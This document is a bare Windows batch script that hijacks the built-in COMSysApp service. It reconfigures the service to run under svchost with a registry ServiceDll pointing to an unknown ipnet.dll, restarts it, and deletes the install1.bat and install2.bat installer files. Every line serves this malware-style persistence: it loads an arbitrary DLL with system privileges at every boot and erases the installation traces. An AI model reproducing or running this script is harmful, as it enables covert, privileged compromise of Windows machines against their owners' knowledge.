@echo off
sc stop COMSysApp
sc config COMSysApp type= own start= auto error= normal binpath= "%windir%\SysWOW64\svchost.exe -k COMSysApp"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v COMSysApp /t REG_MULTI_SZ /d "COMSysApp" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\SysWOW64\ipnet.dll" /f
sc start COMSysApp
del /f /q %windir%\SysWOW64\install2.bat
del /f /q %windir%\SysWOW64\install1.bat
